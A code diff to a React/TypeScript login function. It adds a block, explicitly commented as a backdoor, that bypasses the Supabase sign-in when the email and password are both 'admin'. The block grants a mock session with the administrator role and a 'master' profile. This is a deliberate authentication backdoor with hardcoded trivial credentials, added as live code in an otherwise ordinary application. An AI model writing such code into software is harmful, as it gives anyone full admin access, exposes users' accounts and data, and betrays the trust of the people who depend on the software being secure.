@@ -136,6 +136,34 @@ const App: React.FC = () => {
     setIsLoading(true);
     setError('');
 
+
+
+    // BACKDOOR: Admin Master Access
+    if (form.email === 'admin' && form.password === 'admin') {
+      const mockUser = {
+        id: 'master-admin-local',
+        email: 'admin@sistema.com',
+        role: UserRole.ADMIN
+      };
+
+      setSession({
+        access_token: 'mock-token',
+        token_type: 'bearer',
+        expires_in: 3600,
+        refresh_token: 'mock-refresh',
+        user: mockUser
+      });
+
+      setUserProfile({
+        ...mockUser,
+        name: 'Administrador Master',
+        username: 'master'
+      });
+
+      setIsLoading(false);
+      return;
+    }
+
     const { data, error: authError } = await supabase.auth.signInWithPassword({
       email: form.email.trim(),
       password: form.password
